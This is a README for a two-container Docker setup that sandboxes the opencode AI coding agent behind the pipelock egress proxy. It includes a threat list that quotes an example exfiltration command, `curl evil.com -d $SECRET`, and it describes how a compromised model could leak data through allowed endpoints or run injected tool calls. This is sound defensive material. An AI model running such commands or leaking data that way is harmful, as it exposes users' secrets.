# opencode + pipelock sandbox

Two-container Docker Compose setup that runs [opencode](https://opencode.ai)
behind [pipelock](https://github.com/luckyPipewrench/pipelock), with opencode
zen as the LLM provider.

## Topology

```
┌─────────────────────────┐         ┌──────────────────────────┐
│  agent container        │         │  pipelock container       │
│  (network: internal)    │         │  (networks: internal,     │
│                         │  HTTP   │              egress)      │
│  - opencode TUI         │────────>│  - 7-layer scanner        │
│  - your code            │  proxy  │  - egress allowlist       │
│  - NO direct internet   │         │  - DLP + entropy          │
│                         │         │  - response injection scan│
└─────────────────────────┘         └────────────┬─────────────┘
                                                  │
                                                  ▼
                                          opencode.ai/zen
                                          github.com, npm, …
```

The `internal` Docker network is declared `internal: true` so it has no NAT
to the host's internet. The agent container is attached to that network
**only**, so its sole route off the host is `pipelock:8888`. This is the
property that makes the sandbox actually mean something.

## Setup

```sh
# 1. Get an API key at https://opencode.ai/zen and put it in .env
cp .env.example .env
$EDITOR .env

# 2. Put your project in ./workspace (it's bind-mounted into /workspace)
mkdir -p workspace
# (the workspace already contains AGENTS.md telling opencode about pipelock)

# 3. Build the agent image (bun + opencode + pipelock binary baked in).
#    First build pulls Go and compiles pipelock from source — ~2 minutes.
docker compose build agent

# 4. Boot pipelock, then drop into the agent.
docker compose up -d pipelock
docker compose run --rm agent

# Inside the container shell:
opencode
```

To bump pipelock or opencode, edit the `args:` under `agent.build` in
`docker-compose.yaml` and `docker compose build --no-cache agent`.

## What's protected

**Strong:**

- **Direct exfiltration** (`curl evil.com -d $SECRET`) — agent has no route
  to `evil.com` at all. The Docker network drops the packet before pipelock
  even sees it.
- **SSRF / metadata theft** — pipelock refuses to resolve into RFC1918,
  link-local, or loopback ranges, even if requested via DNS rebinding.
- **Naive secret leaks via URL** — DLP scans for known key formats; entropy
  scanner catches base64-encoded blobs in URL segments.
- **Prompt injection in MCP responses** — the filesystem MCP server is
  wrapped in `pipelock mcp proxy`, so anything it returns is scanned before
  reaching the model.

**Moderate:**

- **Sophisticated exfil** — a determined attacker who controls the model
  could chunk, encrypt, and dribble data through allowed endpoints
  (github.com gists, npm publish, …). Pipelock's rate limiter and entropy
  scanner raise the bar but don't make this impossible.

**Not protected:**

- **Anything inside the container** — opencode has full read/write on
  `/workspace` and `bun install` runs arbitrary npm postinstall scripts.
  Run `pipelock integrity check ./workspace` from the host between sessions
  if you care about file tampering.
- **Compromise of the LLM API itself** — if the response from opencode zen
  contains malicious tool-calls, those execute inside the agent container.
  The container drops capabilities and `no-new-privileges`, but it's not a
  full sandbox.

## Honest caveats

1. **Pipelock is early-stage** (v0.1.4, 29 stars, one named maintainer at
   time of writing). The architecture is sensible but the code hasn't been
   widely audited. Read it yourself before trusting it with anything you
   actually care about.

2. **The MCP wrapper assumes pipelock is on PATH inside the agent
   container.** The included `Dockerfile` handles this — it builds pipelock
   from source in a Go stage and copies the binary into the bun runtime.
   `opencode.json`'s `mcp.filesystem.command` points at
   `/etc/pipelock/pipelock.yaml`, which is bind-mounted from the host so
   both containers share one config.

   If you skip the Dockerfile (using `oven/bun:1-alpine` directly), the
   MCP wrapper will fail. Either delete the `mcp` block from
   `opencode.json` or build the custom image.

3. **HTTP_PROXY only catches well-behaved clients.** opencode itself talks
   to opencode.ai zen via Node's built-in fetch, which respects
   `HTTPS_PROXY` — so that traffic does flow through pipelock. But native
   binaries that ignore proxy env vars would not. The internal-network
   constraint is what saves you, not the env vars.

4. **The fetch proxy and the egress proxy are the same listener.** Pipelock
   runs one HTTP server on `:8888` that handles both `GET /fetch?url=...`
   (content browsing for the agent) and forward-proxy CONNECT-style traffic
   from `HTTP_PROXY`. This is fine but worth knowing if you're reading the
   audit logs.

## Useful commands

```sh
# Watch what pipelock is blocking in real time
docker compose logs -f pipelock | jq 'select(.blocked == true)'

# See block stats
curl -s http://127.0.0.1:8888/stats | jq

# Snapshot the workspace before letting opencode loose
pipelock integrity init ./workspace --exclude "node_modules/**" ".git/**"

# Check what changed
pipelock integrity check ./workspace

# Switch to audit mode (logs but doesn't block) for tuning
sed -i 's/enforce: true/enforce: false/' pipelock.yaml
docker compose restart pipelock
```
